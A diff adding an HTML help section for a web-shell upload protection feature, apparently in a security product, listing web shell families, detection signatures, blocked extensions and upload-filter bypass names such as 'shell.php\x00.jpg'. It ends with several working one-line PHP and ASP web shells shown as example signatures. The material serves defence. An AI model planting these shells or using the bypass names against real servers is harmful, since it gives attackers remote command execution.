+              <p>Prevents attackers from uploading web shells (backdoor scripts) that provide remote access and command execution on the server.</p>
+
+              <h4>🎯 Detected Web Shell Types</h4>
+              <ul>
+                  <li><strong>c99 Shell:</strong> <code>c99.php</code>, <code>c99_madrid</code> variants</li>
+                  <li><strong>r57 Shell:</strong> <code>r57.php</code>, <code>r57shell</code> variants</li>
+                  <li><strong>b374k Shell:</strong> <code>b374k.php</code>, <code>b374k-mini</code> variants</li>
+                  <li><strong>China Chopper:</strong> <code>caidao.asp</code>, <code>caidao.php</code></li>
+                  <li><strong>WSO (Web Shell by oRb):</strong> <code>wso.php</code>, <code>webshell.php</code></li>
+                  <li><strong>ShellBot:</strong> IRC bot shells</li>
+                  <li><strong>PHP Simple Shell:</strong> <code>shell.php</code>, <code>cmd.php</code></li>
+                  <li><strong>ASPX Shell:</strong> <code>shell.aspx</code>, <code>cmd.aspx</code></li>
+                  <li><strong>JSP Shell:</strong> <code>shell.jsp</code>, <code>cmd.jsp</code></li>
+                  <li><strong>Perl/CGI Shell:</strong> <code>shell.cgi</code>, <code>cmd.pl</code></li>
+                  <li><strong>Python Shell:</strong> <code>shell.py</code>, <code>backdoor.py</code></li>
+                  <li><strong>Node.js Shell:</strong> <code>shell.js</code>, <code>backdoor.js</code></li>
+              </ul>
+
+              <h4>🔍 Detection Signatures</h4>
+              <ul>
+                  <li><strong>System Command Functions:</strong> <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>popen()</code></li>
+                  <li><strong>File Manipulation:</strong> <code>file_put_contents()</code>, <code>fopen()</code>, <code>chmod()</code></li>
+                  <li><strong>Code Execution:</strong> <code>eval()</code>, <code>assert()</code>, <code>create_function()</code></li>
+                  <li><strong>Base64 Decoding:</strong> <code>base64_decode()</code>, <code>gzinflate()</code>, <code>str_rot13()</code></li>
+                  <li><strong>Known Shell Signatures:</strong> <code>$c99</code>, <code>$r57</code>, <code>b374k</code>, <code>wso_version</code></li>
+                  <li><strong>Obfuscation Patterns:</strong> Multiple nested functions, concatenated strings</li>
+                  <li><strong>Web Shell User-Agents:</strong> <code>Mozilla/5.0 (Windows NT; r57shell)</code></li>
+                  <li><strong>Filename Patterns:</strong> <code>*shell*</code>, <code>*backdoor*</code>, <code>*cmd*</code></li>
+              </ul>
+
+              <h4>🛡️ Protection Techniques</h4>
+              <ul>
+                  <li>Content-based Signature Matching</li>
+                  <li>MIME Type Validation (text/plain disguised as image)</li>
+                  <li>File Extension Blacklist (.php, .phtml, .php3, .asp, .aspx, .jsp, .jspx, .cgi, .pl, .py)</li>
+                  <li>Double Extension Detection (<code>shell.jpg.php</code>)</li>
+                  <li>Null Byte Poisoning Prevention (<code>shell.php\x00.jpg</code>)</li>
+                  <li>Code Obfuscation Detection</li>
+                  <li>Function Call Whitelist</li>
+                  <li>Heuristic Analysis (unusual combinations of dangerous functions)</li>
+                  <li>Entropy Analysis (high entropy = suspicious for encoded payloads)</li>
+                  <li>Anti-Virus Scanning Integration (optional)</li>
+              </ul>
+
+              <h4>🚫 Blocked File Extensions</h4>
+              <ul>
+                  <li>PHP: <code>.php</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.phtml</code>, <code>.phps</code></li>
+                  <li>ASP: <code>.asp</code>, <code>.aspx</code>, <code>.ashx</code>, <code>.asmx</code>, <code>.asax</code></li>
+                  <li>JSP: <code>.jsp</code>, <code>.jspx</code>, <code>.jws</code>, <code>.jsw</code></li>
+                  <li>CGI/Perl: <code>.cgi</code>, <code>.pl</code>, <code>.pm</code></li>
+                  <li>Python: <code>.py</code>, <code>.pyc</code></li>
+                  <li>Ruby: <code>.rb</code>, <code>.rbw</code></li>
+                  <li>Shell: <code>.sh</code>, <code>.bash</code>, <code>.zsh</code></li>
+              </ul>
+
+              <h4>📋 Example Web Shell Signatures Blocked</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          &lt;?php eval($_POST['cmd']); ?&gt;
+          &lt;?php system($_GET['cmd']); ?&gt;
+          &lt;?php @assert($_POST['c']); ?&gt;
+          &lt;?= `$_GET[cmd]` ?&gt;
+          &lt;% eval request("cmd") %&gt;
+          &lt;%@ Page Language="Jscript" %&gt;&lt;%eval(Request.Item["cmd"],"unsafe");%&gt;</pre>
           </template>
 
           <!-- OTHERS CATEGORY -->
